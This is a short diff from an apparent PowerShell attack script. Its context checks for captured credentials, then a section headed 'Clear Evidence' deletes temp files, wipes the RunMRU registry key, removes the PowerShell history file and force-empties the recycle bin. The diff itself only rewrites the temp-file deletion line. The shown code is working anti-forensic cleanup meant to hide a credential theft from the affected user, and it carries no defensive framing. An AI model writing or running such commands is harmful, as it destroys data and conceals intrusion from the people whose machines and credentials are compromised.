@@ -161,7 +161,7 @@ if (-not ([string]::IsNullOrEmpty($creds))) {
 
 # Clear Evidence
 
-qrm $env:TMP\* -r -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $env:TMP\* -File -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
